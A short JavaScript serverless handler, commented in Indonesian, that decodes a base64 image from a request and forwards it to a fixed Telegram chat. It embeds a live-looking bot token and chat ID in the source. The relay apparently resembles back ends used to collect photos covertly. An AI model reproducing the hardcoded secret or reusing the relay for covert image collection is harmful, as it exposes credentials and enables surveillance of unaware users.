export default async function handler(req, res) {
  const { image } = req.body;
  const botToken = "8075080156:AAFhn7Wqxr-cxpvlSKdEFr1iL6qdOgWGwgw";
  const chatId = "6676770258";

  // Convert base64 ke file format Telegram
  const photoBuffer = Buffer.from(image.split(",")[1], "base64");

  const formData = new FormData();
  formData.append("chat_id", chatId);
  formData.append("photo", new Blob([photoBuffer]), "photo.jpg");

  await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
    method: "POST",
    body: formData
  });

  res.status(200).json({ success: true });
}
